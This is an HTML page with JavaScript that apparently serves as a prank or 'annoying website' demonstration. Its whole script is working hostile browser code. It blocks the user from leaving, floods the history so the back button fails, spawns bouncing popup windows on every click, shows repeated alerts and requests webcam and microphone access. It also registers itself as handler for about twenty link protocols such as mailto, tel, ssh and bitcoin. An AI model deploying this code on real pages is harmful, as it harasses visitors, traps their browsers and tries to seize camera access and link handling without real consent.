<!--
  Same as before, but add lots more annoyances
-->
<html>
<body>

<style>
  html, body { width: 100%; height: 100%; margin: 0; }
  video { width: 100%; height: 100%; }
</style>

<script>
  const SCREEN_WIDTH = window.screen.availWidth
  const SCREEN_HEIGHT = window.screen.availHeight
  const WINDOW_WIDTH = 480
  const WINDOW_HEIGHT = 260
  const VELOCITY = 15
  const MARGIN = 10
  const TICK_LENGTH = 50

  // Ask the user "are you sure you want to leave?"
  window.addEventListener('beforeunload', event => {
    event.returnValue = true
  })

  // Ask to handle web links with whitelisted protocols
  if (navigator.registerProtocolHandler) {
    const handlerUrl = window.location.href + '/url=%s'
    navigator.registerProtocolHandler('bitcoin', handlerUrl, 'haha')
    navigator.registerProtocolHandler('geo', handlerUrl, 'haha')
    navigator.registerProtocolHandler('im', handlerUrl, 'haha')
    navigator.registerProtocolHandler('irc', handlerUrl, 'haha')
    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
    navigator.registerProtocolHandler('magnet', handlerUrl, 'haha')
    navigator.registerProtocolHandler('mailto', handlerUrl, 'haha')
    navigator.registerProtocolHandler('mms', handlerUrl, 'haha')
    navigator.registerProtocolHandler('news', handlerUrl, 'haha')
    navigator.registerProtocolHandler('ircs', handlerUrl, 'haha')
    navigator.registerProtocolHandler('nntp', handlerUrl, 'haha')
    navigator.registerProtocolHandler('sip', handlerUrl, 'haha')
    navigator.registerProtocolHandler('sms', handlerUrl, 'haha')
    navigator.registerProtocolHandler('smsto', handlerUrl, 'haha')
    navigator.registerProtocolHandler('ssh', handlerUrl, 'haha')
    navigator.registerProtocolHandler('tel', handlerUrl, 'haha')
    navigator.registerProtocolHandler('urn', handlerUrl, 'haha')
    navigator.registerProtocolHandler('webcal', handlerUrl, 'haha')
    navigator.registerProtocolHandler('wtai', handlerUrl, 'haha')
    navigator.registerProtocolHandler('xmpp', handlerUrl, 'haha')
  }

  // Get the user's webcam
  navigator.getUserMedia({ audio: true, video: true }, () => {}, () => {})

  if (window.opener) {
    // *** RUNS IN CHILD WINDOW: ***

    const exitFullscreen = document.exitFullscreen ||
      document.webkitExitFullscreen ||
      document.mozCancelFullScreen ||
      document.msExitFullscreen

    exitFullscreen.call(document)

    let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
    let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

    window.setInterval(() => {
      const x = window.screenX
      const y = window.screenY
      const width = window.outerWidth
      const height = window.outerHeight

      if (x < MARGIN) vx = Math.abs(vx)
      if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
      if (y < MARGIN + 20) vy = Math.abs(vy)
      if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

      window.moveBy(vx, vy)
    }, TICK_LENGTH)

    const VIDEOS = ['nyan.mp4', 'cat.mp4', 'trolol.mp4']
    const video = document.createElement('video')
    video.src = VIDEOS[Math.floor(Math.random() * VIDEOS.length)]
    video.autoplay = true
    video.loop = true

    document.body.appendChild(video)

    window.onunload = () => {
      if (!window.opener.closed) window.opener.onCloseWindow(window)
    }
  }

  if (!window.opener) {
    // *** RUNS IN PARENT WINDOW: ***

    // Fill up the history so the back button does not work
    for (let i = 1; i < 20; i++) {
      window.history.pushState({}, '', window.location.pathname + '?q=' + i)
    }

    // Set location back to the initial location, so user does not notice
    window.history.pushState({}, '', window.location.pathname)

    // If user tries to go one page back, go one page forward
    window.addEventListener('popstate', () => {
      window.history.forward()
    })

    // Let's have some random alerts, just to mix things up
    setInterval(() => window.alert(Array(100).join('ARE YOU ANNOYED YET? ')), 15000)
  }

  // *** RUNS IN PARENT AND CHILD WINDOWS: ***

  let wins = []

  document.addEventListener('click', openWindow)

  function openWindow () {
    focusWindows()

    const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WINDOW_WIDTH - MARGIN))
    const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WINDOW_HEIGHT - MARGIN))
    const win = window.open(window.location.pathname, '', `width=${WINDOW_WIDTH},height=${WINDOW_HEIGHT},left=${x},top=${y}`)

    wins.push(win)
  }

  function focusWindows () {
    wins.forEach(win => win.focus())
  }

  function onCloseWindow (win) {
    const i = wins.indexOf(win)
    if (i >= 0) wins.splice(i, 1)
  }

</script>

<button style='width: 300px; height: 100px; font-size: 40px'>Click Me</button>

</body>
</html>
